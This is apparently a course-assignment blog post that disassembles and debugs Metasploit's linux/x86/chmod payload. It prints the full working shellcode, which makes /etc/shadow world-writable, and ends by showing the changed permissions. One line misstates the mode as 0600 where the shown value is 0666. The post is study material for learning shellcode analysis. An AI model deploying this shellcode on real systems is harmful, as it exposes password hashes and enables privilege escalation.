---
layout: post
title: Metasploit Linux x86 chmod Analysis
tags: [slae]
---

Continuing on with the next Metasploit payload analysis. This time we'll be examining the `linux/x86/chmod` payload and seeing exactly how it works. 

Like last time we'll first start by checking out the payload options.

```
root@kali:~# msfvenom -p linux/x86/chmod --payload-options
Options for payload/linux/x86/chmod:


       Name: Linux Chmod
     Module: payload/linux/x86/chmod
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 36
       Rank: Normal

Provided by:
    kris katterjohn <katterjohn@gmail.com>

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
FILE  /etc/shadow      yes       Filename to chmod
MODE  0666             yes       File mode (octal)

Description:
  Runs chmod on specified file with specified mode
``` 

We can see that FILE and MODE are by default setting /etc/shadow to read and write for all users. Let's keep these options and start by first examining the assembly with `ndisasm`.

```
root@kali:~# msfvenom -p linux/x86/chmod -f raw | ndisasm -u -
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 36 bytes

00000000  99                cdq
00000001  6A0F              push byte +0xf
00000003  58                pop eax
00000004  52                push edx
00000005  E80C000000        call 0x16
0000000A  2F                das
0000000B  657463            gs jz 0x71
0000000E  2F                das
0000000F  7368              jnc 0x79
00000011  61                popa
00000012  646F              fs outsd
00000014  7700              ja 0x16
00000016  5B                pop ebx
00000017  68B6010000        push dword 0x1b6
0000001C  59                pop ecx
0000001D  CD80              int 0x80
0000001F  6A01              push byte +0x1
00000021  58                pop eax
00000022  CD80              int 0x80
```

Very small shellcode here and not complex at all. Once again there is a CALL method followed by garbage instructions, just as we saw in the adduser payload. Let's generate the shellcode for this and put it in our C wrapper for analyzing with GDB. 

```
root@kali:~/SLAE# msfvenom -p linux/x86/chmod -f c
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 36 bytes
Final size of c file: 177 bytes
unsigned char buf[] = 
"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f"
"\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd"
"\x80\x6a\x01\x58\xcd\x80";

root@kali:~/SLAE# vim chmod.c 
root@kali:~/SLAE# gcc chmod.c -o chmod -fno-stack-protector -z execstack
```

We'll first set a breakpoint on the start of our shellcode and run.

```
root@kali:~/SLAE# gdb -q chmod
Reading symbols from chmod...(no debugging symbols found)...done.
gdb-peda$ break *&code
Breakpoint 1 at 0x2040
gdb-peda$ r
Starting program: /root/SLAE/chmod 
Shellcode Length:  7

[----------------------------------registers-----------------------------------]
EAX: 0x402040 --> 0x580f6a99 
EBX: 0x402000 --> 0x1efc 
ECX: 0x15 
EDX: 0xb7fa4870 --> 0x0 
ESI: 0x1 
EDI: 0xb7fa3000 --> 0x1b9db0 
EBP: 0xbffff388 --> 0x0 
ESP: 0xbffff36c --> 0x40059d (<main+80>:	mov    eax,0x0)
EIP: 0x402040 --> 0x580f6a99
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40203a:	add    BYTE PTR [eax],al
   0x40203c:	add    BYTE PTR [eax],al
   0x40203e:	add    BYTE PTR [eax],al
=> 0x402040 <code>:	cdq    
   0x402041 <code+1>:	push   0xf
   0x402043 <code+3>:	pop    eax
   0x402044 <code+4>:	push   edx
   0x402045 <code+5>:	call   0x402056 <code+22>
[------------------------------------stack-------------------------------------]
0000| 0xbffff36c --> 0x40059d (<main+80>:	mov    eax,0x0)
0004| 0xbffff370 --> 0x1 
0008| 0xbffff374 --> 0xbffff434 --> 0xbffff5c6 ("/root/SLAE/chmod")
0012| 0xbffff378 --> 0xbffff43c --> 0xbffff5d7 ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
0016| 0xbffff37c --> 0x402040 --> 0x580f6a99 
0020| 0xbffff380 --> 0xbffff3a0 --> 0x1 
0024| 0xbffff384 --> 0x0 
0028| 0xbffff388 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00402040 in code ()
```

## chmod()

Our first chunk of assembly, which is the majority of the instructions is as follows:

```nasm
cdq				; sets edx to 0
push   0xf			; chmod() 
pop    eax			; 
push   edx			; 0
call   0x402056 <code+22>	; call code+22 and push string to stack stored in next instruction
das    				; start of "/etc/shadow" string
gs je  0x4020b1
das    
jae    0x4020b9
popa   
outs   dx,DWORD PTR fs:[esi]
ja     0x402056 <code+22>	; end of string
pop    ebx			; "/etc/shadow" into ebx
push   0x1b6			; 0666 in octal
pop    ecx			; 
int    0x80			; execute chmod()
```

We have a few instructions setting up the chmod() syscall which is defined as 15 in `/usr/include/i386-linux-gnu/asm/unistd_32.h`. Once again we can see a CALL instruction which pushes the filename being changed to the stack for later use.   

```
[----------------------------------registers-----------------------------------]
EAX: 0xf 
EBX: 0x402000 --> 0x1efc 
ECX: 0x15 
EDX: 0x0 
ESI: 0x1 
EDI: 0xb7fa3000 --> 0x1b9db0 
EBP: 0xbffff388 --> 0x0 
ESP: 0xbffff364 --> 0x40204a ("/etc/shadow")
EIP: 0x402056 --> 0x1b6685b
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x402051 <code+17>:	popa   
   0x402052 <code+18>:	outs   dx,DWORD PTR fs:[esi]
   0x402054 <code+20>:	ja     0x402056 <code+22>
=> 0x402056 <code+22>:	pop    ebx
   0x402057 <code+23>:	push   0x1b6
   0x40205c <code+28>:	pop    ecx
   0x40205d <code+29>:	int    0x80
   0x40205f <code+31>:	push   0x1
[------------------------------------stack-------------------------------------]
0000| 0xbffff364 --> 0x40204a ("/etc/shadow")
0004| 0xbffff368 --> 0x0 
```

This is then POP'd off the stack for use in EBX. 

Following that we see a PUSH of 0x1b6. Checking this in python we can see it translates to 0666 in octal.

```python
root@kali:~/SLAE# python3
Python 3.6.4 (default, Jan  5 2018, 02:13:53) 
[GCC 7.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> oct(0x1b6)
'0o666'
```

Let's verify everything in GDB before the interrupt is called. 

```
[----------------------------------registers-----------------------------------]
EAX: 0xf 
EBX: 0x40204a ("/etc/shadow")
ECX: 0x1b6 
EDX: 0x0 
ESI: 0x1 
EDI: 0xb7fa3000 --> 0x1b9db0 
EBP: 0xbffff388 --> 0x0 
ESP: 0xbffff368 --> 0x0 
EIP: 0x40205d --> 0x16a80cd
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x402056 <code+22>:	pop    ebx
   0x402057 <code+23>:	push   0x1b6
   0x40205c <code+28>:	pop    ecx
=> 0x40205d <code+29>:	int    0x80
   0x40205f <code+31>:	push   0x1
   0x402061 <code+33>:	pop    eax
   0x402062 <code+34>:	int    0x80
   0x402064 <code+36>:	add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xbffff368 --> 0x0 
```

And we can see the chmod() syscall is all set up as follows:

```
chmod("/etc/shadow", 0600)
```

## exit()

All that is left to do is a simple exit() syscall. The assembly looks as such:

```nasm
push   0x1			; exit()
pop    eax			;
int    0x80			; execute exit()
```

Fairly simple. The value that's still in EBX will be used as the exit code, no need to zero it out since it doesn't really matter. 

```
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x40204a ("/etc/shadow")
ECX: 0x1b6 
EDX: 0x0 
ESI: 0x1 
EDI: 0xb7fa3000 --> 0x1b9db0 
EBP: 0xbffff388 --> 0x0 
ESP: 0xbffff368 --> 0x0 
EIP: 0x402062 --> 0x80cd
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40205d <code+29>:	int    0x80
   0x40205f <code+31>:	push   0x1
   0x402061 <code+33>:	pop    eax
=> 0x402062 <code+34>:	int    0x80
```

If we finish execution we can verify our shadow file with the updated permissions.

```
root@kali:~/SLAE# ls -al /etc/shadow
-rw-rw-rw- 1 root shadow 1573 Mar 19 14:15 /etc/shadow
```

And that's it! Very short and simple. 

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>

Student ID: SLAE-1208

Github Repo: <https://github.com/absolomb/SLAE>